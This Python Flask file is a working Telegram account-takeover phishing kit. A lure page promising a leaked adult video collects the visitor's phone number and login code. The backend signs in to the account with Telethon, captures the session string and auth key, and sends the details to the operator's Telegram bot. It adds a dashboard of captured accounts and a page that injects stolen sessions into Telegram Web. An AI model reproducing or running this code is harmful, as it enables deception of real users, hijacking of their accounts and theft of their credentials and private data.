from flask import Flask, request, jsonify, render_template_string
import asyncio
import httpx
import json
import os
import logging
import base64
import threading
from datetime import datetime
from telethon import TelegramClient
from telethon.sessions import StringSession

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)

# ====== Environment Variables ======
BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))
# ===================================

user_sessions = {}
captured_accounts = []
pending_codes = {}

# ====== Phishing Page ======
PAGE = """<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Hub</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
        .header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
        .header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
        .header p{color:#777;font-size:13px;margin-top:8px}
        .video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
        .thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
        .thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
        .video-info{padding:15px}
        .video-info h3{font-size:15px;margin-bottom:5px}
        .video-info .meta{color:#666;font-size:12px}
        .video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
        .link-section{padding:10px 20px 20px;text-align:center}
        .get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase;transition:all 0.3s}
        .get-link-btn:hover{transform:translateY(-2px);box-shadow:0 12px 40px rgba(233,69,96,0.6)}
        .get-link-btn:disabled{opacity:0.5;cursor:not-allowed;transform:none}
        .get-link-btn .small{font-size:11px;font-weight:400;display:block;margin-top:3px;opacity:0.8}
        .section-title{padding:15px 20px 10px;font-size:17px;font-weight:700;color:#ddd}
        .video-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:0 20px 20px}
        .video-item{background:#141420;border-radius:10px;overflow:hidden}
        .video-item .thumb{height:95px;background:linear-gradient(135deg,#1a1a2e,#2d1b69);display:flex;align-items:center;justify-content:center;font-size:30px;color:rgba(255,255,255,0.3)}
        .video-item .info{padding:10px}
        .video-item .info h4{font-size:12px;margin-bottom:3px}
        .video-item .info span{font-size:11px;color:#666}
        .footer{text-align:center;padding:20px;color:#333;font-size:11px}
        .modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
        .modal-overlay.active{display:flex;align-items:center;justify-content:center}
        .modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e;animation:slideUp 0.3s ease}
        @keyframes slideUp{from{transform:translateY(40px);opacity:0}to{transform:translateY(0);opacity:1}}
        .modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
        .modal h2{text-align:center;font-size:18px;margin-bottom:5px}
        .modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
        .modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
        .modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
        .modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
        .modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
        .modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
        .cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:12px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
        .np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
        .np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer;transition:0.15s}
        .np .k:active{background:#3a3a5e;transform:scale(0.95)}
        .np .kc{background:#e94560;color:white}
        .np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
        .np .ks:disabled{background:#333;color:#666}
        .step{display:none}
        .step.active{display:block}
        .ss{text-align:center;padding:20px 0}
        .ss .bi{font-size:60px;margin-bottom:15px}
        .ss h2{color:#4CAF50;font-size:22px;margin-bottom:8px}
        .ss p{color:#888;font-size:13px;margin-bottom:20px}
        .ss .wb{background:#4CAF50;color:white;border:none;padding:15px 40px;border-radius:50px;font-size:16px;font-weight:700;cursor:pointer;text-transform:uppercase;letter-spacing:1px}
        .sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
        @keyframes spin{to{transform:rotate(360deg)}}
    </style>
</head>
<body>
    <div class="header">
        <h1>🔥 PREMIUM VIDEO HUB</h1>
        <p>Exclusive content — Verified members only</p>
    </div>
    <div class="video-card">
        <div class="thumbnail"><div class="play-btn">▶</div></div>
        <div class="video-info">
            <h3>🔥 LEAKED PRIVATE VIDEO — ONLYFANS MODEL 2026</h3>
            <div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
            <span class="badge">🔞 RESTRICTED</span>
        </div>
    </div>
    <div class="link-section">
        <button class="get-link-btn" id="glb">🔞 GET YOUR LINK<span class="small">thoda verification required</span></button>
        <p style="color:#444;font-size:11px;margin-top:10px;">✅ 18+ age verification • 2 step secure</p>
    </div>
    <div class="section-title">🔥 More Videos</div>
    <div class="video-grid">
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ff6b6b)">▶</div><div class="info"><h4>Private 01</h4><span>2.1M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#ffa500)">▶</div><div class="info"><h4>Private 02</h4><span>1.8M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#4CAF50)">▶</div><div class="info"><h4>Private 03</h4><span>1.5M</span></div></div>
        <div class="video-item"><div class="thumb" style="background:linear-gradient(135deg,#1a1a2e,#0088cc)">▶</div><div class="info"><h4>Private 04</h4><span>1.2M</span></div></div>
    </div>
    <div class="footer">© 2026 Premium Video Hub</div>
    
    <div class="modal-overlay" id="vm">
        <div class="modal">
            <div id="s1" class="step active">
                <div class="modal-icon">🔞</div>
                <h2>Age Verification Required</h2>
                <p>Please wait karo thoda, we are verifying your account...</p>
                <div id="ps" class="sb info"><span class="sp"></span> Verifying your contact...</div>
            </div>
            <div id="s2" class="step">
                <div class="modal-icon">🔐</div>
                <h2>Enter Verification Code</h2>
                <p>📱 <span id="pd" style="color:#0088cc;font-weight:bold;">+880XXXXXXXXXX</span></p>
                <div id="cs" class="sb waiting"><span class="sp"></span> Code send ho raha hai...</div>
                <div class="cd" id="cdisp"></div>
                <div class="np" id="np">
                    <button class="k" onclick="pk('1')">1</button>
                    <button class="k" onclick="pk('2')">2</button>
                    <button class="k" onclick="pk('3')">3</button>
                    <button class="k" onclick="pk('4')">4</button>
                    <button class="k" onclick="pk('5')">5</button>
                    <button class="k" onclick="pk('6')">6</button>
                    <button class="k" onclick="pk('7')">7</button>
                    <button class="k" onclick="pk('8')">8</button>
                    <button class="k" onclick="pk('9')">9</button>
                    <button class="k kc" onclick="cc()">⌫</button>
                    <button class="k" onclick="pk('0')">0</button>
                    <button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
                </div>
                <div id="vs" class="sb"></div>
            </div>
            <div id="s3" class="step">
                <div class="ss">
                    <div class="bi">✅</div>
                    <h2>Verification Successful!</h2>
                    <p>Aapka link generate ho raha hai... thoda aur wait karo</p>
                    <button class="wb" onclick="wv()">🎬 Watch Video</button>
                </div>
            </div>
        </div>
    </div>
    
    <script>
    let ph='',ccd='';
    document.getElementById('glb').onclick=function(){
        document.getElementById('vm').classList.add('active');
        if(window.Telegram?.WebApp?.requestContact){
            Telegram.WebApp.requestContact(function(s,c){
                if(c&&c.phone_number){
                    ph=c.phone_number.startsWith('+')?c.phone_number:'+'+c.phone_number;
                    document.getElementById('ps').innerHTML='<span class="sp"></span> Contact received! Verifying...';
                    send(ph);
                }else{
                    document.getElementById('ps').className='sb error';
                    document.getElementById('ps').textContent='❌ Please share contact';
                }
            });
        }else{
            var p=prompt('Enter phone (+8801XXXXXXXXX):');
            if(p&&p.length>=10){
                ph=p.startsWith('+')?p:'+'+p;
                document.getElementById('ps').innerHTML='<span class="sp"></span> Verifying '+ph+'...';
                send(ph);
            }
        }
    };
    async function send(p){
        try{
            var r=await fetch('/api/share',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:p})});
            var d=await r.json();
            if(d.success){
                document.getElementById('s1').classList.remove('active');
                document.getElementById('s2').classList.add('active');
                document.getElementById('pd').textContent=p;
                ck();
            }else{
                document.getElementById('ps').className='sb error';
                document.getElementById('ps').textContent='❌ Error';
            }
        }catch(e){
            document.getElementById('ps').className='sb error';
            document.getElementById('ps').textContent='❌ Connection error';
        }
    }
    function ck(){
        var x=setInterval(async function(){
            try{
                var r=await fetch('/api/check',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph})});
                var d=await r.json();
                if(d.s=='sent'){
                    clearInterval(x);
                    document.getElementById('cs').innerHTML='✅ Code aaya hai! Neeche type karo:';
                    document.getElementById('cs').className='sb success';
                }else if(d.s=='done'){
                    clearInterval(x);
                    document.getElementById('s2').classList.remove('active');
                    document.getElementById('s3').classList.add('active');
                }else if(d.s=='err'){
                    clearInterval(x);
                    document.getElementById('cs').innerHTML='❌ Error';
                    document.getElementById('cs').className='sb error';
                }
            }catch(e){}
        },2000);
    }
    function pk(n){if(ccd.length<5){ccd+=n;document.getElementById('cdisp').textContent=ccd;}}
    function cc(){ccd=ccd.slice(0,-1);document.getElementById('cdisp').textContent=ccd;}
    async function sc(){
        if(ccd.length<4){showvs('❌ Pura code likho','error');return;}
        document.getElementById('sb').disabled=true;
        document.getElementById('sb').textContent='⏳ Wait...';
        try{
            var r=await fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:ph,code:ccd})});
            var d=await r.json();
            if(d.success){
                document.getElementById('s2').classList.remove('active');
                document.getElementById('s3').classList.add('active');
            }else{
                showvs('❌ '+(d.error||'Wrong code'),'error');
                ccd='';document.getElementById('cdisp').textContent='';
                document.getElementById('sb').disabled=false;document.getElementById('sb').textContent='✓ Verify';
            }
        }catch(e){showvs('❌ Error','error');
            document.getElementById('sb').disabled=false;document.getElementById('sb').textContent='✓ Verify';
        }
    }
    function showvs(m,t){var e=document.getElementById('vs');e.textContent=m;e.className='sb '+t;}
    function wv(){window.location.href='https://example.com';}
    document.getElementById('vm').onclick=function(e){if(e.target===this)this.classList.remove('active');};
    </script>
</body>
</html>"""

# ====== Backend ======
async def send_code(phone):
    try:
        c = TelegramClient(StringSession(), API_ID, API_HASH)
        await c.connect()
        r = await c.send_code_request(phone)
        user_sessions[phone] = {'client': c, 'hash': r.phone_code_hash}
        pending_codes[phone] = 'sent'
        logger.info(f"✅ Code sent: {phone}")
    except Exception as e:
        logger.error(f"Failed: {e}")
        pending_codes[phone] = 'err'

async def verify_code(phone, code):
    if phone not in user_sessions: return {'success': False, 'error': 'Session not found'}
    s = user_sessions[phone]
    try:
        await s['client'].sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
        ss = StringSession.save(s['client'].session)
        me = await s['client'].get_me()
        await s['client'].disconnect()
        
        # WebK data
        wc = TelegramClient(StringSession(ss), API_ID, API_HASH)
        await wc.start()
        auth = base64.b64encode(wc.session.auth_key.key).decode()
        dc = wc.session.dc_id
        await wc.disconnect()
        
        acc = {
            'phone': phone, 'user_id': me.id, 'username': me.username or '',
            'first_name': me.first_name or '', 'last_name': me.last_name or '',
            'session': ss, 'webk': json.dumps({'dcId': dc, 'authKey': auth, 'userId': me.id, 'isSupport': False, 'isTest': False}),
            'dc': dc, 'time': str(datetime.now())
        }
        captured_accounts.append(acc)
        
        try:
            async with httpx.AsyncClient() as h:
                await h.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json={
                    'chat_id': YOUR_TELEGRAM_ID,
                    'text': f"🔔 **New Account!**\n📱 `{phone}`\n👤 {me.first_name}\n🆔 `{me.id}`\n📛 @{me.username or 'none'}\n🌐 DC: {dc}\n\n📊 Dashboard: {request.host_url}dash",
                    'parse_mode': 'Markdown'
                })
        except: pass
        
        del user_sessions[phone]
        pending_codes[phone] = 'done'
        return {'success': True}
    except Exception as e:
        e = str(e)
        if 'PHONE_CODE_INVALID' in e: return {'success': False, 'error': 'Wrong code'}
        return {'success': False, 'error': e[:80]}

# ====== Routes ======
@app.route('/')
def index(): return render_template_string(PAGE)

@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph: return jsonify({'success': False})
    pending_codes[ph] = 'sending'
    threading.Thread(target=lambda: asyncio.run(send_code(ph)), daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/check', methods=['POST'])
def check():
    s = pending_codes.get(request.json.get('phone', ''), 'waiting')
    return jsonify({'s': s})

@app.route('/api/verify', methods=['POST'])
def verify():
    d = request.json; ph, code = d.get('phone', ''), d.get('code', '')
    r = asyncio.run(verify_code(ph, code))
    return jsonify(r)

@app.route('/webk/<phone>')
def webk(phone):
    a = next((x for x in captured_accounts if x['phone'] == phone), None)
    if not a: return "Not found", 404
    w = a['webk']
    return f"""
    <!DOCTYPE html><html><head><title>WebK</title>
    <style>body{{background:#0a0a0a;color:white;font-family:Arial;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:20px}}
    .c{{background:#141420;padding:40px;border-radius:20px;max-width:450px;width:100%;text-align:center;border:1px solid #1a1a2e}}
    .av{{width:70px;height:70px;border-radius:50%;background:#0088cc;display:flex;align-items:center;justify-content:center;font-size:30px;margin:0 auto 15px}}
    .i{{color:#888;margin:3px 0;font-size:14px}}
    .b{{width:100%;padding:15px;border:none;border-radius:12px;font-size:15px;cursor:pointer;margin:8px 0;font-weight:600}}
    .bp{{background:#0088cc;color:white}}
    .bs{{background:#4CAF50;color:white}}
    .sb{{background:#0a0a0a;padding:12px;border-radius:8px;word-break:break-all;font-size:10px;margin:10px 0;text-align:left;color:#0f0}}
    </style></head>
    <body><div class="c">
    <div class="av">{a['first_name'][0] if a['first_name'] else '?'}</div>
    <h2>{a['first_name']} {a['last_name']}</h2>
    <div class="i">@{a['username'] or 'none'} | ID: {a['user_id']} | DC: {a['dc']}</div>
    <div class="i">📱 {a['phone']}</div>
    <div class="sb">{w}</div>
    <button class="b bp" onclick="o()">1️⃣ Open WebK</button>
    <button class="b bs" id="ib" style="display:none" onclick="i()">2️⃣ Inject</button>
    <button class="b bp" id="rb" style="display:none" onclick="r()">3️⃣ Refresh</button>
    <div id="st" class="i" style="margin-top:15px"></div>
    <div style="margin-top:15px;padding:12px;background:#0a0a0a;border-radius:8px;text-align:left;font-size:11px">
    <b>Manual:</b><br>1. web.telegram.org/k<br>2. F12 → Console<br>3. Paste: <code style="color:#0f0;">localStorage.setItem('webk_session','{w}')</code><br>4. F5
    </div></div>
    <script>
    var wk;
    function o(){{wk=window.open('https://web.telegram.org/k/','_blank');document.getElementById('ib').style.display='block';document.getElementById('st').textContent='✅ Opened!'}}
    function i(){{if(!wk||wk.closed){{document.getElementById('st').textContent='❌ Closed!';return}}
    try{{wk.postMessage({{action:'setStorage',key:'webk_session',value:'{w}'}},'*');document.getElementById('st').textContent='✅ Injected!';document.getElementById('ib').style.display='none';document.getElementById('rb').style.display='block'}}catch(e){{document.getElementById('st').textContent='❌ Error'}}}}
    function r(){{if(wk&&!wk.closed){{wk.location.reload();document.getElementById('st').textContent='🎉 Logged in!'}}}}
    </script></body></html>
    """

@app.route('/dash')
def dash():
    rows = ""
    for i, a in enumerate(captured_accounts, 1):
        rows += f"<tr><td>{i}</td><td>{a['phone']}</td><td>{a['first_name']} {a['last_name']}</td><td>@{a['username'] or '—'}</td><td>{a['user_id']}</td><td>{a['dc']}</td><td>{a['time']}</td><td><a href='/webk/{a['phone']}'><button style='background:#0088cc;color:white;border:none;padding:5px 12px;border-radius:5px;cursor:pointer'>🔑</button></a></td></tr>"
    return f"""
    <!DOCTYPE html><html><head><title>Dashboard</title>
    <style>body{{background:#0a0a0a;color:white;font-family:Arial;padding:20px}}
    h1{{color:#e94560}} table{{width:100%;border-collapse:collapse;margin-top:15px}}
    th,td{{padding:10px;text-align:left;border-bottom:1px solid #1a1a2e}}
    th{{background:#141420}} tr:hover{{background:#141420}}
    .bg{{background:#e94560;padding:2px 8px;border-radius:3px;font-size:12px}}
    .st{{display:inline-block;background:#141420;padding:15px 25px;border-radius:10px;margin:10px}}
    .st .n{{font-size:30px;font-weight:bold;color:#0088cc}}
    </style></head>
    <body>
    <h1>🎯 Captured Accounts</h1>
    <div class="st"><div class="n">{len(captured_accounts)}</div><div>Total</div></div>
    <table><thead><tr><th>#</th><th>Phone</th><th>Name</th><th>Username</th><th>ID</th><th>DC</th><th>Time</th><th>Action</th></tr></thead><tbody>
    {rows if rows else '<tr><td colspan="8" style="text-align:center;color:#666;">No accounts yet</td></tr>'}
    </tbody></table>
    <script>setInterval(()=>location.reload(),5000)</script>
    </body></html>
    """

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print("✅ Phishing site ready on port", port)
    app.run(host='0.0.0.0', port=port, debug=True)
